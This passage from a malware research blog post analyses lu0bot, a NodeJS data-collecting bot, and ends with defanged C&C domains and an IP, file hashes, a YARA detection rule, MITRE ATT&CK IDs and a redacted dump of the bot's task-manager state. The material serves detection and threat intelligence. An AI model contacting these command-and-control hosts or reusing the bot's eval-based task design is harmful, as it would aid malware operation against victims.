/><figcaption><em>NodeJs used is from a 2016 build.</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="3494" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/what_year_is_it-1/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/what_year_is_it-1.jpg?fit=666%2C570&amp;ssl=1" data-orig-size="666,570" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="what_year_is_it-1" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/what_year_is_it-1.jpg?fit=300%2C257&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/what_year_is_it-1.jpg?fit=666%2C570&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/what_year_is_it-1.jpg?resize=500%2C428&#038;ssl=1" alt="" class="wp-image-3494" width="500" height="428" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/what_year_is_it-1.jpg?w=666&amp;ssl=1 666w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/what_year_is_it-1.jpg?resize=300%2C257&amp;ssl=1 300w" sizes="auto, (max-width: 500px) 100vw, 500px" /><figcaption><em>I feel old by looking the changelog&#8230;</em></figcaption></figure></div>



<p>The issue mentioned above is &#8220;seen&#8221; when lu0bot is pushing and executing &#8220;<strong>bootstrap-base.js</strong>&#8220;. On build 0.10.XXX, &#8220;<strong>Buffer</strong>&#8221; wasn&#8217;t fully implemented yet.  So the maldev has implemented missing function(s) on this specific version, I found this &#8220;interesting&#8221;, because it means it will stay with a static <strong>NodeJS </strong>runtime environment that won&#8217;t change for a while (or likely never). This is a way for avoiding cryptography troubleshooting issues, between updates it could changes in implementations that could break the whole project. So fixed build is avoiding maintenance or unwanted/unexpected hotfixes that could caused too much cost/time consumption for the creator of lu0bot (everything is business \o/).</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="900" height="283" data-attachment-id="3469" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/nodejs_baseinit_stage/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?fit=969%2C305&amp;ssl=1" data-orig-size="969,305" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nodejs_baseinit_stage" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?fit=300%2C94&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?fit=900%2C283&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?resize=900%2C283&#038;ssl=1" alt="" class="wp-image-3469" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?w=969&amp;ssl=1 969w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?resize=300%2C94&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_baseinit_stage.png?resize=768%2C242&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /><figcaption><em>Interesting module version value in bootstrap-base.js</em></figcaption></figure></div>



<p>Of course, We couldn&#8217;t deny that lu0bot is maybe an old malware, but this statement needs to be taken with cautiousness.  </p>



<p>By looking into &#8220;bootstrap-base.js&#8221;, the module is apparently already on version &#8220;6.0.15&#8221;, but based on experience, versioning is always a confusing thing with maldev(s), they have all a different approach, so with current elements, it is pretty hard to say more due to the lack of samples.</p>



<h2 class="wp-block-heading">What is the purpose of lu0bot ?</h2>



<p>Well, to be honest, I don’t know… I hate making suggestions with too little information, it&#8217;s dangerous and too risky. I don’t want to lead people to the wrong path. It&#8217;s already complicated to explain something with no &#8220;public&#8221; records, even more, when it is in a programming language for that specific purpose. At this stage, It&#8217;s smarter to focus on what the code is able to do, and it is certain that <em><strong>it&#8217;s a decent data collector</strong></em>.</p>



<p>Also, this simplistic and efficient NodeJS loader code saved at the core of lu0bot is basically everything and nothing at the same time, the <strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a></strong> function and its multi-layer task manager could lead to any possibilities, where each action could be totally independent of the others,  so thinking about features like :</p>



<ul class="wp-block-list"><li>Backdoor  ?</li><li>Loader  ?</li><li>RAT  ?</li><li>Infostealer  ? </li></ul>



<p>All scenario are possible, but as i said before I could be right or totally wrong.</p>



<h2 class="wp-block-heading">Where it could be seen ?</h2>



<p>Currently, it seems that lu0bot is pushed by the well-known load seller <a href="https://medium.com/csis-techblog/gcleaner-garbage-provider-since-2019-2708e7c87a8a" data-type="URL" data-id="https://medium.com/csis-techblog/gcleaner-garbage-provider-since-2019-2708e7c87a8a">Garbage Cleaner</a> on EU/US Zones irregularly with an average of possible 600-1000 new bots (each wave), depending on the operator(s) and days. </p>



<h2 class="wp-block-heading">Appendix</h2>



<h3 class="wp-block-heading">IoCs</h3>



<h4 class="wp-block-heading">IP</h4>



<ul class="wp-block-list"><li>5.188.206[.]211</li></ul>



<h4 class="wp-block-heading">lu0bot loader C&amp;C&#8217;s (HTTP)</h4>



<ul class="wp-block-list" id="block-6a7088a9-750a-4612-a091-d7a605ec5ee4"><li>hr0[.]xyz</li><li>hr1[.]xyz</li><li>hr2[.]xyz</li><li>hr3[.]xyz</li><li>hr4[.]xyz</li><li>hr5[.]xyz</li><li>hr6[.]xyz</li><li>hr7[.]xyz</li><li>hr8[.]xyz</li><li>hr9[.]xyz</li><li>hr10[.]xyz</li></ul>



<h4 class="wp-block-heading">lu0bot main C&amp;C&#8217;s (UDP side)</h4>



<ul class="wp-block-list"><li>lu00[.]xyz</li><li>lu01[.]xyz</li><li>lu02[.]xyz</li><li>lu03[.]xyz</li></ul>



<h3 class="wp-block-heading">Yara</h3>



<pre class="wp-block-code"><code>rule lu0bot_cpp_loader
{
    meta:
        author = "Fumik0_"
        description = "Detecting lu0bot C/C++ lightweight loader"

    strings:
        $hex_1 = {
            BE 00 20 40 00 
            89 F7 
            89 F0
            81 C7 ?? 01 00 00 
            81 2E ?? ?? ?? ?? 
            83 C6 04 
            39 FE 
            7C ?? 
            BB 00 00 00 00 
            53 50 
            E8 ?? ?? ?? ??
            E9 ?? ?? ?? ??
        }
    
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and
        (filesize &gt; 2KB and filesize &lt; 5KB) and 
        any of them
    
}</code></pre>



<h3 class="wp-block-heading">IoCs</h3>



<pre class="wp-block-preformatted">fce3d69b9c65945dcfbb74155f2186626f2ab404e38117f2222762361d7af6e2  Lu0bot loader.exe
c88e27f257faa0a092652e42ac433892c445fc25dd445f3c25a4354283f6cdbf  Lu0bot loader.exe
b8b28c71591d544333801d4673080140a049f8f5fbd9247ed28064dd80ef15ad  Lu0bot loader.exe
5a2264e42206d968cbcfff583853a0e0d4250f078a5e59b77b8def16a6902e3f  Lu0bot loader.exe
f186c2ac1ba8c2b9ab9b99c61ad3c831a6676728948ba6a7ab8345121baeaa92  Lu0bot loader.exe


8d8b195551febba6dfe6a516e0ed0f105e71cf8df08d144b45cdee13d06238ed  response1.bin
214f90bf2a6b8dffa8dbda4675d7f0cc7ff78901b3c3e03198e7767f294a297d  response2.bin
c406fbef1a91da8dd4da4673f7a1f39d4b00fe28ae086af619e522bc00328545  response3.bin

ccd7dcdf81f4acfe13b2b0d683b6889c60810173542fe1cda111f9f25051ef33  Intel MEC 246919961
e673547a445e2f959d1d9335873b3bfcbf2c4de2c9bf72e3798765ad623a9067  Intel MEC 750293792</pre>



<h3 class="wp-block-heading">Example of lu0bot interaction</h3>



<pre class="wp-block-code"><code>
ko
{ pid: 'XXXXXX',
  aid: '5.188.206.211 19584',
  q: XXXXXXXXXX, 
  t: XXXXXXXXXXXXX,
  lq: 
   { ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 30 00 00 00 00 09 00 00 26 02&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 74 72 75 65&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 74 72 75 65&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 37 39 38&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 37 39 38&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
     ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ] },
  pk: 'BASE64_ENCRYPTED',
  k: &lt;Buffer 3c 60 22 73 97 cc 76 22 bc eb b5 79 46 3d 05 9e&gt;,
  mp: 
   { XXXXXXXXXXXX: 
      { id: 'XXXXXXXXXXXX',
        pid: 'XXXXXXX',
        gen: XXXXXXXXXXXXX,
        last: XXXXXXXXXXXXX,
        tmr: &#91;Object],
        p: {},
        psz: 1163,
        btotal: 0,
        type: 'download',
        hn: 'bufread',
        target: 'binit',
        fp: &lt;Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad 44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb c9 ...&gt;,i
        size: 798,
        fcb: &#91;Function],
        rcb: &#91;Function],
        interval: 200,
        last_sev: XXXXXXXXXXXXX,
        stmr: false },
     XXXXXXXXXXXX: 
      { id: 'XXXXXXXXXXXX',
        pid: 'XXXXXXX',
        gen: XXXXXXXXXXXXX,
        last: XXXXXXXXXXXXX,
        tmr: &#91;Object],
        p: {},
        psz: 1163,
        btotal: 0,
        type: 'download',
        hn: 'bufread',
        target: 'binit',
        fp: &lt;Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad 44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb c9 ...&gt;,
        size: 798,
        fcb: &#91;Function],
        rcb: &#91;Function],
        interval: 200,
        last_sev: XXXXXXXXXXXXX,
        stmr: false },
     XXXXXXXXXXXX: 
      { id: 'XXXXXXXXXXXX',
        pid: 'XXXXXXX',
        gen: XXXXXXXXXXXXX,
        last: XXXXXXXXXXXXX,
        tmr: &#91;Object],
        p: {},
        psz: 1163,
        btotal: 0,
        type: 'download',
        hn: 'bufread',
        target: 'binit',
        fp: &lt;Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad 44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb c9 ...&gt;,
        size: 798,
        fcb: &#91;Function],
        rcb: &#91;Function],
        interval: 200,
        last_sev: XXXXXXXXXXXXX,
        stmr: false },
     XXXXXXXXXXXX: 
      { id: 'XXXXXXXXXXXX',
        pid: 'XXXXXXX',
        gen: XXXXXXXXXXXXX,
        last: XXXXXXXXXXXXX,
        tmr: &#91;Object],
        p: {},
        psz: 1163,
        btotal: 0,
        type: 'download',
        hn: 'bufread',
        target: 'binit',
        fp: &lt;Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad 44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb c9 ...&gt;,
        size: 798,
        fcb: &#91;Function],
        rcb: &#91;Function],
        interval: 200,
        last_sev: XXXXXXXXXXXXX,
        stmr: false },
     XXXXXXXXXXXX: 
      { id: 'XXXXXXXXXXXX',
        pid: 'XXXXXXX',
        gen: XXXXXXXXXXXXX,
        last: XXXXXXXXXXXXX,
        tmr: &#91;Object],
        p: {},
        psz: 1163,
        btotal: 0,
        type: 'download',
        hn: 'bufread',
        target: 'binit',
        fp: &lt;Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad 44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb c9 ...&gt;,
        size: 798,
        fcb: &#91;Function],
        rcb: &#91;Function] } },
  h: 
   { eval: &#91;Function],
     bufwrite: &#91;Function],
     bufread: &#91;Function],
     filewrite: &#91;Function],
     fileread: &#91;Function] },
  mp_pget: &#91;Function],
  mp_pget_ev: &#91;Function],
  mp_new: &#91;Function: mp_new],
  mp_get: &#91;Function: mp_get],
  mp_count: &#91;Function: mp_count],
  mp_loss: &#91;Function: mp_loss],
  mp_del: &#91;Function: mp_del],
  mp_dtchk: &#91;Function: mp_dtchk],
  mp_dtsum: &#91;Function: mp_dtsum],
  mp_pset: &#91;Function: mp_pset],
  mp_opnew: &#91;Function: mp_opnew],
  mp_opstat: &#91;Function: mp_opstat] }
lq
{ ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 30 00 00 00 00 09 00 00 26 02&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 74 72 75 65&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 74 72 75 65&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 37 39 38&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 37 39 38&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ],
  ' XXXXXXXXXXXXX': &#91; 1, &lt;Buffer 31&gt; ] 
}</code></pre>



<h3 class="wp-block-heading">MITRE ATT&amp;CK</h3>



<ul class="wp-block-list"><li>T1059</li><li>T1482</li><li>T1083</li><li>T1046</li><li>T1057</li><li>T1518</li><li>T1082</li><li>T1614</li><li>T1016</li><li>T1124</li><li>T1005</li><li>T1008</li><li>T1571</li></ul>



<h3 class="wp-block-heading">ELI5 summary</h3>



<ul class="wp-block-list"><li>lu0bot is a NodeJS Malware.</li><li>Network communications are mixing TCP (loader) and UDP (main stage).</li><li>It&#8217;s pushed at least with Garbage Cleaner.</li><li>Its default setup seems to be a aggressive telemetry harvester.</li><li>Due to its task manager architecture it is technically able to be everything.</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="753" height="644" data-attachment-id="3500" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/summary/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Summary.png?fit=753%2C644&amp;ssl=1" data-orig-size="753,644" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Summary" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Summary.png?fit=300%2C257&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Summary.png?fit=753%2C644&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Summary.png?resize=753%2C644&#038;ssl=1" alt="" class="wp-image-3500" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Summary.png?w=753&amp;ssl=1 753w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Summary.png?resize=300%2C257&amp;ssl=1 300w" sizes="auto, (max-width: 753px) 100vw, 753px" /></figure></div>



<h2 class="wp-block-heading">Conclusion</h2>



<p>Lu0bot is a curious piece of code which I could admit, even if I don&#8217;t like at all NodeJS/JavaScript code, the task manager succeeded in mindblowing me for its ingeniosity. </p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="498" height="280" data-attachment-id="3613" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/mb/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/mb.gif?fit=498%2C280&amp;ssl=1" data-orig-size="498,280" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="mb" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/mb.gif?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/mb.gif?fit=498%2C280&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/mb.gif?resize=498%2C280&#038;ssl=1" alt="" class="wp-image-3613"/><figcaption><em>A wild fumik0_ being amazed by the task manager implementation</em></figcaption></figure></div>



<p>I have more questions than answers since then I started to put my hands on that one, but the thing that I&#8217;m sure, it&#8217;s active and harvesting data from bots that I have never seen before in such an aggressive way.<br><br>Special thanks: @benkow_ </p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-3431" class="share-twitter sd-button share-icon" href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-3431" class="share-facebook sd-button share-icon" href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-140610880-3431-67621c4af057a' data-src='https://widgets.wp.com/likes/?ver=14.2-a.3#blog_id=140610880&amp;post_id=3431&amp;origin=fumik0.com&amp;obj_id=140610880-3431-67621c4af057a&amp;n=1' data-name='like-post-frame-140610880-3431-67621c4af057a' data-title='Like or Reblog'><h3 class="sd-title">Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
															</div>

						</article>

						<section class="modified-date" itemprop="dateModified" content="2021-06-24T08:37:41+00:00">
							Last modified: June 24, 2021						</section>

						<section class="tags">
													</section>

																<h3 class="section-title">Author</h3>
			<aside class="author-card" itemscope itemprop="author" itemtype="http://schema.org/Person">
				<div class="author-avatar">
					<img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=96&#038;d=identicon&#038;r=g" class="rounded-circle" itemprop="image">
				</div>
				<div class="author-info">
					<div class="author-title">
						<a href="https://fumik0.com/author/fumko/" itemprop="name">
							fumko						</a>
					</div>
					<div class="author-description" itemprop="description">  
											</div>
				</div>
			</aside>
								
													
<div id="comments" class="discussion-wrapper">
	<h3 class="section-title">Comments</h3>
	<div class="discussion-timeline">
								
		<div id="respond" class="comment-respond">
			<h3 id="reply-title" class="comment-reply-title">Leave a Reply<small><a rel="nofollow" id="cancel-comment-reply-link" href="/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/#respond" style="display:none;">Cancel reply</a></small></h3>			<form id="commentform" class="comment-form">
				<iframe
					title="Comment Form"
					src="https://jetpack.wordpress.com/jetpack-comment/?blogid=140610880&#038;postid=3431&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=identicon&#038;greeting=Leave+a+Reply&#038;jetpack_comments_nonce=9f986b656c&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=light&#038;lang=en_US&#038;jetpack_version=14.2-a.3&#038;iframe_unique_id=1&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;is_current_user_subscribed=0&#038;token_key=%3Bnormal%3B&#038;sig=6913482a74f01b32f7c5f7803ea10e69abbcebd7#parent=https%3A%2F%2Ffumik0.com%2F2021%2F06%2F24%2Flu0bot-an-unknown-nodejs-malware-using-udp%2F"
											name="jetpack_remote_comment"
						style="width:100%; height: 430px; border:0;"
										class="jetpack_remote_comment"
					id="jetpack_remote_comment"
					sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"
				>
									</iframe>
									<!--[if !IE]><!-->
					<script>
						document.addEventListener('DOMContentLoaded', function () {
							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
							for (var i = 0; i < commentForms.length; i++) {
								commentForms[i].allowTransparency = false;
								commentForms[i].scrolling = 'no';
							}
						});
					</script>
					<!--<![endif]-->
							</form>
		</div>

		
		<input type="hidden" name="comment_parent" id="comment_parent" value="" />

			</div>
</div>

												
					
							</main>

							<aside id="aside-container" class="col-lg-4 col-md-4 col-sm-12" role="complementary">
					
	<div id="sidebar" class="sidebar">
		<section id="categories-3" class="widget widget_categories"><h2 class="widget-title">Categories</h2>
			<ul>
					<li class="cat-item cat-item-602944907"><a href="https://fumik0.com/category/botnet/">botnet</a> (2)
</li>
	<li class="cat-item cat-item-602944904"><a href="https://fumik0.com/category/projects/">Projects</a> (1)
</li>
	<li class="cat-item cat-item-602944906"><a href="https://fumik0.com/category/reverse/">Reverse</a> (7)
</li>
	<li class="cat-item cat-item-1"><a href="https://fumik0.com/category/uncategorized/">Uncategorized</a> (3)
</li>
			</ul>

			</section><section id="archives-3" class="widget widget_archive"><h2 class="widget-title">Archives</h2>
			<ul>
					<li><a href='https://fumik0.com/2021/06/'>June 2021</a></li>
	<li><a href='https://fumik0.com/2021/04/'>April 2021</a></li>
	<li><a href='https://fumik0.com/2019/12/'>December 2019</a></li>
	<li><a href='https://fumik0.com/2019/08/'>August 2019</a></li>
	<li><a href='https://fumik0.com/2019/05/'>May 2019</a></li>
	<li><a href='https://fumik0.com/2019/03/'>March 2019</a></li>
	<li><a href='https://fumik0.com/2019/02/'>February 2019</a></li>
	<li><a href='https://fumik0.com/2018/12/'>December 2018</a></li>
	<li><a href='https://fumik0.com/2018/10/'>October 2018</a></li>
	<li><a href='https://fumik0.com/2018/05/'>May 2018</a></li>
	<li><a href='https://fumik0.com/2018/01/'>January 2018</a></li>
			</ul>

			</section>	</div>

	<div id="sidebar-sticky" class="sidebar sticky-top">
		<nav id="toc" class="toc" role="navigation"></nav>
	</div>
				</aside>
			
		</div><!-- .row -->
		
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/" rel="prev"><i class="fas fa-angle-left"></i> <span class="screen-reader-text">Previous Post</span> Anatomy of a simple and popular packer</a></div></div>
	</nav>	</div><!-- .container -->
</div><!-- .data-schema -->


			<footer class="footer" role="contentinfo">
								<section class="footer-sidebar">
					<div class="container px-responsive">
						<div class="row my-4">
							<section id="rss_links-5" class="widget widget_rss_links col-lg col-md-4 col-sm-12"><p><a target="_self" href="https://fumik0.com/feed/" title="Subscribe to posts"><img src="https://fumik0.com/wp-content/plugins/jetpack/images/rss/orange-small.png" alt="RSS feed" /></a></p>
</section>						</div>
					</div>
				</section>
				
				<div class="container footer-columns">
					<div class="footer-column-left">
						<div>Copyright &copy; 2024 <strong><a href="https://fumik0.com">Fumik0_&#039;s box</a></strong>. All rights reserved. Theme by <a href="https://terryl.in/" target="_blank">Mynote</a>. </div>
						<div></div>
					</div>
					<div class="footer-column-right">
						<nav class="footer-nav"><ul id="menu-social-media" class="social-icon-links"><li id="menu-item-273"><a href="http://tracker.fumik0.com"><i class="fas fa-link"></i></a></li>
<li id="menu-item-13"><a target="_blank" href="https://twitter.com/fumik0_"><span class="brand-sm"><i class="fab fa-twitter twitter brand-link"></i></span></a></li>
<li id="menu-item-424"><a href="https://github.com/Fmk0"><span class="brand-sm"><i class="fab fa-github-alt github brand-link"></i></span></a></li>
